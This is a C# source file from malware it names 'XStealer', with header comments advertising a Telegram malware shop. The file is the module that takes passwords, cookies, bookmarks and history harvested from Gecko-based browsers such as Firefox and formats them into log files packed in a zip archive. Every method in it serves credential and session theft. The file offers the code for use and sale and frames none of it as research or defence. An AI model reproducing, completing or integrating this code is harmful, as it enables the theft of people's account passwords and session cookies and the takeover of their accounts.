// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Modules.Browsers.Gecko
{
    using System.Collections.Generic;
    using System.IO;
    using Helpers;

    public static class GFormatLog
    {
        #region Format Passwords Log | Для записей паролей в файл (формат лога)
        private static string FormatPassword(Structures.Password_Gecko pPassword) => $"Hostname: {pPassword.G_Url}\nUsername: {pPassword.G_Username}\nPassword: {pPassword.G_Pass}\nBrowser: {pPassword.G_App}\r\n\r\n";
        public static bool WritePasswords(List<Structures.Password_Gecko> pPasswords, string fileName)
        {
            using var ms = new MemoryStream { Position = 0 };
            foreach (Structures.Password_Gecko pPassword in pPasswords)
            {
                if (!string.IsNullOrWhiteSpace(pPassword.G_Username) && !string.IsNullOrWhiteSpace(pPassword.G_Pass))
                {
                    try
                    {
                        byte[] stringToBytes = ConverterEx.ToBytes(false, FormatPassword(pPassword));
                        ms.Write(stringToBytes, 0, stringToBytes.Length);
                    }
                    catch { continue; }
                }
            }
            ZipEx.AddKeyPairStream(fileName, ms?.ToArray() ?? ms.GetBuffer() ?? null);
            return true;
        }
        #endregion

        #region Format Cookies Log | Для записей куков в файл (формат лога)
        private static string FormatCookie(Structures.Cookies_Gecko cCookie) => $"{cCookie.G_HostKey}TRUE\t{cCookie.G_Path}\tFALSE\t{cCookie.G_ExpiresUtc}\t{cCookie.G_Name}\t{cCookie.G_Value}\r\n"; // {cCookie.G_HostKey}\tTRUE
        public static bool WriteCookies_NetSpace(List<Structures.Cookies_Gecko> cCookies, string fileName)
        {
            using var ms = new MemoryStream { Position = 0 };
            foreach (Structures.Cookies_Gecko cCookie in cCookies)
            {
                try
                {
                    byte[] stringToBytes = ConverterEx.ToBytes(false, FormatCookie(cCookie));
                    ms.Write(stringToBytes, 0, stringToBytes.Length);
                }
                catch { continue; }
            }
            ZipEx.AddKeyPairStream(fileName, ms?.ToArray() ?? ms.GetBuffer() ?? null);
            return true;
        }
        #endregion

        #region Format Bookmarks Log | Для записей закладок в файл (формат лога)
        //private static string FormatBookmark(Structures.Bookmark_Gecko bBookmark) => !string.IsNullOrEmpty(bBookmark.G_Url) ? $"[ {bBookmark.G_Title} ] ({bBookmark.G_Url})\n" : $"[ {bBookmark.G_Title} ]\n";
        private static string FormatBookmark(Structures.Bookmark_Gecko bBookmark) => $"Title: {bBookmark.G_Title}"; // \n
        public static bool WriteBookmarks(List<Structures.Bookmark_Gecko> bBookmarks, string fileName)
        {
            using var ms = new MemoryStream { Position = 0 };
           // using var data = new StreamWriter(ms, Encoding.Default, 65536); // лучше Encoding.Default 
            foreach (Structures.Bookmark_Gecko bBookmark in bBookmarks)
            {
                try
                {
                    //data.WriteLine(FormatBookmark(bBookmark));
                    //data.Flush();
                    byte[] stringToBytes = ConverterEx.ToBytes(false, FormatBookmark(bBookmark));
                    ms.Write(stringToBytes, 0, stringToBytes.Length);
                }
                catch { continue; }
            }
            ZipEx.AddKeyPairStream(fileName, ms?.ToArray() ?? ms.GetBuffer() ?? null);
            return true;
        }
        #endregion

        #region Format History Log | Для записей истории в файл (формат лога)
        private static string FormatHistory(Structures.History_Gecko sSite) => $"Title: [{sSite.G_Title}] - Url: ({sSite.G_Url}) - Rev_Host: [{sSite.G_RevHost}]\r\n";
        public static bool WriteHistory(List<Structures.History_Gecko> sHistory, string fileName)
        {
            using var ms = new MemoryStream { Position = 0 };
            foreach (Structures.History_Gecko sSite in sHistory)
            {
                long size = FileX.GetInfoFile(fileName); // Получаем размер файла
                int LimitFile = 400000; // Устанавливаем лимитный размер записи в файл
                if (size <= LimitFile) // Если размер файла не превышает лимит...
                {
                    try
                    {
                       byte[] stringToBytes = ConverterEx.ToBytes(false, FormatHistory(sSite));
                       ms.Write(stringToBytes, 0, stringToBytes.Length);
                    }
                    catch { continue; }
                }
                continue;
            }
            ZipEx.AddKeyPairStream(fileName, ms?.ToArray() ?? ms.GetBuffer() ?? null);
            return true;
        }
        #endregion
    }
}